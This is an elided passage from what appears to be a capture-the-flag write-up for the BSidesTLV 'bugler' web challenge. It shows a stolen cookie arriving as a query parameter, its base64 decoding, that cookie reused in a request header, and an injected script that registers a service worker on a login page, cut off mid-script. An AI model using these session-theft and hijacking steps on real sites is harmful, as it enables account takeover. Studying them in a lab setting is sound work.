...
```
/?cookie=[AWS_SECRET_REMOVED]NTVlNzEyNjMwOGNjNWJjYzZlMmI=
```

Let's decode the cookie:

```console
root@kali:/media/sf_CTFs/bsidestlv/bugler# echo [AWS_SECRET_REMOVED]NTVlNzEyNjMwOGNjNWJjYzZlMmI= | base64 -d
BSidesTLV=[AWS_SECRET_REMOVED]
```
...
>   -H 'Cookie: BSidesTLV=[AWS_SECRET_REMOVED]' \
...
#HttpOnly_bugler.ctf.bsidestlv.com      FALSE   /       FALSE   0       session .eJxdjTsOwjAQBe-yNYqz_[AWS_SECRET_REMOVED]ghffKBEZn1NM4oZJNow5BjYwUtOhq0_MgdfHCcfbnAOfWIbc-pdicLd5UoHkopx0swdDzk37vJc1Y9F5X9Tfft_ooquDZn2_QekfitY.Xv8e1A.qnqT3p441qbAKDrYKFVz6fcINzg
```
...
```javascript
<script>
navigator.serviceWorker.register('[AWS_SECRET_REMOVED]a33a08127c803d7e1.JS', {
      scope: '/login'
   })
   .then((reg) => {
